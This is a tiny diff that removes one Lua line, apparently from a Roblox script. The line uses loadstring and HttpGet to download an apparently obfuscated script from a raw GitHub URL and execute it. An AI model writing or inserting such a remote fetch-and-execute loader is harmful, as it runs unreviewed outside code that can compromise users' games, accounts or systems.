@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/lm9awd8103/lm9awd8103/refs/heads/main/Protected_8120378482238809.lua.txt"))()
